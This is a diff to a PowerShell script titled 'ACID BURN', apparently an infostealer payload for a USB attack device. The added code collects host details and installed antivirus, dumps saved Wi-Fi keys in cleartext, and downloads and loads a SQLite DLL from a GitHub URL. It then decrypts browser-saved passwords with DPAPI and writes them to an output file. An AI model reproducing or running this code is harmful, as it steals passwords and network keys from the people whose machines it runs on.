@@ -3,7 +3,44 @@ try {
     "=== ACID BURN ===" | Out-File $out
     "Host: $env:COMPUTERNAME" | Out-File $out -Append
     "User: $env:USERNAME" | Out-File $out -Append
+    "Domain: $env:USERDOMAIN" | Out-File $out -Append
+    "OS: $((Get-CimInstance Win32_OperatingSystem).Caption)" | Out-File $out -Append
+    "Arch: $env:PROCESSOR_ARCHITECTURE" | Out-File $out -Append
+    "IP: $((Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notmatch 'Loopback'}).IPAddress -join ', ')" | Out-File $out -Append
     "" | Out-File $out -Append
+
+    "--- AV ---" | Out-File $out -Append
+    $av = Get-CimInstance -Namespace "root/SecurityCenter2" -ClassName AntiVirusProduct -ErrorAction SilentlyContinue
+    if ($av) { $av.displayName | Out-File $out -Append } else { "(none)" | Out-File $out -Append }
+    "" | Out-File $out -Append
+
+    "--- WIFI ---" | Out-File $out -Append
+    $profiles = (netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object {
+        ($_ -split ":")[1].Trim()
+    }
+    if ($profiles) {
+        foreach ($p in $profiles) {
+            $details = netsh wlan show profile name="$p" key=clear
+            $key = ($details | Select-String "Key Content") -replace ".*:\s*", ""
+            if ($key) { "$p : $key" | Out-File $out -Append }
+        }
+    } else { "(none)" | Out-File $out -Append }
+    "" | Out-File $out -Append
+
+    # --- LOAD SQLITE ---
+    $sqliteDll = "$env:TEMP\System.Data.SQLite.dll"
+    if (-not (Test-Path $sqliteDll)) {
+        try {
+            Invoke-WebRequest -Uri "https://raw.githubusercontent.com/stargosg/Ducky/refs/heads/main/System.Data.SQLite.dll" -OutFile $sqliteDll -UseBasicParsing
+        } catch { }
+    }
+    $sqliteLoaded = $false
+    if (Test-Path $sqliteDll) {
+        try {
+            [System.Reflection.Assembly]::LoadFrom($sqliteDll) | Out-Null
+            $sqliteLoaded = $true
+        } catch { }
+    }
 
     "--- BROWSER PASSWORDS ---" | Out-File $out -Append
     Add-Type -AssemblyName System.Security
@@ -34,30 +71,35 @@ try {
             $tmp = "$env:TEMP\ab_login.db"
             Copy-Item $loginDb $tmp -Force
 
-            $sqlite = [System.Reflection.Assembly]::LoadWithPartialName("System.Data.SQLite")
-            if ($sqlite) {
-                $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tmp")
-                $conn.Open()
-                $cmd = $conn.CreateCommand()
-                $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
-                $reader = $cmd.ExecuteReader()
-                while ($reader.Read()) {
-                    $u = $reader.GetString(1)
-                    $pEnc = $reader.GetValue(2)
-                    $pStr = ""
-                    if ($pEnc -is [byte[]] -and $pEnc.Length -gt 3) {
-                        try {
-                            $blob = $pEnc
-                            if ($blob[0] -eq 118 -and $blob[1] -eq 49 -and $blob[2] -eq 48) {
-                                $blob = $blob[3..($blob.Length-1)]
-                            }
-                            $pDec = [System.Security.Cryptography.ProtectedData]::Unprotect($blob, $null, "CurrentUser")
-                            $pStr = [System.Text.Encoding]::UTF8.GetString($pDec)
-                        } catch { $pStr = "(fail)" }
+            if ($sqliteLoaded) {
+                try {
+                    $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tmp")
+                    $conn.Open()
+                    $cmd = $conn.CreateCommand()
+                    $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
+                    $reader = $cmd.ExecuteReader()
+                    while ($reader.Read()) {
+                        $u = $reader.GetString(1)
+                        $pEnc = $reader.GetValue(2)
+                        $pStr = ""
+                        if ($pEnc -is [byte[]] -and $pEnc.Length -gt 3) {
+                            try {
+                                $blob = $pEnc
+                                if ($blob[0] -eq 118 -and $blob[1] -eq 49 -and $blob[2] -eq 48) {
+                                    $blob = $blob[3..($blob.Length-1)]
+                                }
+                                $pDec = [System.Security.Cryptography.ProtectedData]::Unprotect($blob, $null, "CurrentUser")
+                                $pStr = [System.Text.Encoding]::UTF8.GetString($pDec)
+                            } catch { $pStr = "(fail)" }
+                        }
+                        if ($u) { "$($reader.GetString(0)) | $u | $pStr" | Out-File $out -Append }
                     }
-                    if ($u) { "$($reader.GetString(0)) | $u | $pStr" }
+                    $conn.Close()
+                } catch {
+                    "SQLite error: $_" | Out-File $out -Append
                 }
-                $conn.Close()
+            } else {
+                "SQLite DLL not loaded" | Out-File $out -Append
             }
         }
         "" | Out-File $out -Append
